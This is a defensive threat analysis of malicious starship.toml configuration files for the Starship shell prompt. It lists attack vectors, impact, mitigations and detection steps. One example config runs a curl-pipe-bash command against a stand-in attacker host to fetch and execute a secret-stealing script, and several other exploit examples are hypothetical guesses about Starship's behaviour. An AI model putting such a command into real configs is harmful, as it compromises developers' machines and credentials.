# Threat Analysis: Malicious `starship.toml` from Untrusted Source

## 1. Executive Summary

This document provides a deep analysis of the threat posed by a malicious `starship.toml` file originating from an untrusted source. This threat, categorized as "Critical," could allow an attacker to achieve arbitrary code execution on a developer's machine, potentially leading to severe consequences such as data breaches, malware installation, and denial of service. The primary vulnerability lies within Starship's configuration loading logic, specifically the parsing and interpretation of the TOML file.

## 2. Threat Details

**Threat Name:** Malicious `starship.toml` from Untrusted Source

**Description:** An attacker crafts a `starship.toml` file containing malicious configuration settings that, when parsed and interpreted by Starship, result in the execution of arbitrary commands on the user's system.

**Attack Vector:**

* **Social Engineering:** Tricking a developer into downloading and using the malicious `starship.toml` (e.g., via email attachments, fake tutorials, malicious websites).
* **Compromised Repositories:** Injecting the malicious file into a public or private repository that a developer might clone or use as a template.
* **Supply Chain Attacks:** Compromising a tool or resource that developers commonly use, leading to the distribution of the malicious `starship.toml`.
* **Man-in-the-Middle Attacks:** Intercepting and replacing a legitimate `starship.toml` download with a malicious version.

**Target:** Developers using the Starship prompt customization tool.

**Attacker Goals:**

* **Gain Access to the Developer's Machine:** Establish a foothold for further malicious activities.
* **Steal Credentials:** Obtain sensitive information like SSH keys, API tokens, cloud provider credentials, or passwords stored on the developer's machine.
* **Install Malware:** Deploy ransomware, keyloggers, or other malicious software.
* **Disrupt Work Environment:** Cause system instability, data loss, or prevent the developer from working.
* **Supply Chain Poisoning:** If the developer commits the malicious `starship.toml` to a shared repository, it could potentially affect other developers or even end-users.

## 3. Technical Deep Dive

**Vulnerable Component:** `config` module (specifically the TOML parsing and configuration loading logic).

**Potential Exploitation Techniques:**

The core of the vulnerability lies in how Starship interprets the configuration values within the `starship.toml` file. Here are potential attack vectors:

* **Command Injection via Configuration Values:**
    * **Scenario:** Certain configuration options might allow specifying paths to external programs or scripts. If these paths are not properly sanitized, an attacker could inject malicious commands.
    * **Example (Hypothetical):**
        ```toml
        [custom.my_prompt]
        command = "bash -c 'curl attacker.com/steal_secrets.sh | bash'"
        ```
        If Starship executes this `command` value directly in a shell, it will execute the attacker's script.
* **Exploiting Shell Integration:**
    * **Scenario:** Starship interacts with the shell environment. Certain configurations might leverage shell commands or environment variables in a way that can be manipulated.
    * **Example (Hypothetical):**
        ```toml
        [username]
        format = "[$env_var{USERNAME}]($fg_bold)"
        ```
        If Starship doesn't properly sanitize the `USERNAME` environment variable, an attacker could potentially inject code within the variable itself.
* **Leveraging External Program Calls:**
    * **Scenario:** Starship might allow configuring paths to external programs for specific functionalities.
    * **Example (Hypothetical):**
        ```toml
        [git_branch]
        symbol = "$(which malicious_git_command)"
        ```
        If Starship executes the output of `which malicious_git_command`, and the attacker has placed a malicious executable named `malicious_git_command` in the developer's PATH, it will be executed.
* **Abuse of Plugin/Extension Mechanisms (If Applicable):**
    * **Scenario:** If Starship has a plugin or extension mechanism, the configuration file might allow specifying paths to external plugins.
    * **Exploitation:** The attacker could provide a path to a malicious plugin that executes arbitrary code when loaded by Starship.
* **Denial of Service via Resource Exhaustion:**
    * **Scenario:** While not direct code execution, a malicious `starship.toml` could be crafted to consume excessive resources, leading to a denial of service.
    * **Exploitation:** This could involve deeply nested configurations, extremely long strings, or configurations that trigger infinite loops within Starship's rendering logic.

**Impact Analysis:**

* **Arbitrary Code Execution:** The most critical impact. The attacker gains the ability to execute any command on the developer's machine with the privileges of the user running Starship.
* **Data Breaches:**  Access to sensitive data, including source code, credentials, and personal information.
* **Malware Installation:** Deployment of malicious software for various purposes.
* **Denial of Service:**  Disruption of the developer's workflow and potentially the entire system.
* **Supply Chain Compromise:**  Potential propagation of the malicious configuration to other developers or systems.

## 4. Mitigation Strategies

The development team should implement the following mitigation strategies to address this threat:

**Short-Term Mitigations:**

* **Input Sanitization and Validation:**
    * **Strictly validate all configuration values:** Implement robust checks on the format and content of values read from `starship.toml`.
    * **Sanitize potentially dangerous characters:** Escape or remove characters that could be used for command injection.
    * **Whitelist allowed values:** Where possible, define a limited set of acceptable values for configuration options.
* **Avoid Direct Shell Execution:**
    * **Minimize or eliminate the need to directly execute shell commands based on configuration values.** If necessary, use safer alternatives or carefully sanitize inputs.
    * **Avoid using `eval()` or similar functions on configuration data.**
* **Path Validation:**
    * **Thoroughly validate file paths:** Ensure that paths specified in the configuration point to expected locations and prevent path traversal vulnerabilities.
    * **Avoid executing arbitrary files based on configuration.**
* **User Warnings:**
    * **Clearly document the risks of using `starship.toml` files from untrusted sources.**
    * **Display a warning message when Starship detects a `starship.toml` file outside of the expected configuration directories.**
* **Security Audits:**
    * **Conduct thorough security audits of the `config` module and the TOML parsing logic.**
    * **Use static analysis tools to identify potential vulnerabilities.**

**Long-Term Mitigations:**

* **Secure TOML Parsing Library:**
    * **Ensure the chosen TOML parsing library is actively maintained and has a good security track record.**
    * **Regularly update the TOML parsing library to patch known vulnerabilities.**
* **Sandboxing/Isolation:**
    * **Explore sandboxing techniques to isolate the execution of external commands or scripts triggered by the configuration.** This can limit the impact of a successful exploit.
* **Restricted Configuration Options:**
    * **Carefully review all configuration options that involve executing external commands or interacting with the shell.**
    * **Consider removing or restricting potentially dangerous features if they are not essential.**
* **Content Security Policy (CSP) for Prompt Rendering (If Applicable):**
    * If Starship renders dynamic content in the prompt, implement a Content Security Policy to prevent the execution of arbitrary scripts.
* **Code Signing:**
    * If Starship distributes pre-built binaries, consider code signing to ensure the integrity of the application and prevent tampering.
* **Consider Alternative Configuration Formats:**
    * Evaluate if a more restrictive or sandboxed configuration format could provide better security.
* **Feature Flags for Risky Features:**
    * Introduce feature flags to disable potentially risky configuration options by default, requiring users to explicitly enable them with a clear understanding of the risks.

## 5. Detection and Response

**Detection:**

* **Monitoring Process Execution:** Monitor for unexpected child processes spawned by the shell process running Starship.
* **File System Monitoring:** Detect changes to sensitive files or the creation of new files in unexpected locations.
* **Network Monitoring:** Identify unusual network connections originating from the developer's machine.
* **Anomaly Detection:** Establish baseline behavior for Starship and flag deviations that might indicate malicious activity.

**Response:**

* **Isolate the Affected Machine:** Immediately disconnect the compromised machine from the network.
* **Investigate the Incident:** Analyze system logs, process execution history, and network traffic to understand the scope of the attack.
* **Identify the Malicious `starship.toml`:** Locate and analyze the malicious configuration file.
* **Remediate the System:** Remove the malicious file, scan for malware, and potentially reimage the affected machine.
* **Review Security Practices:** Learn from the incident and update development practices to prevent future attacks.
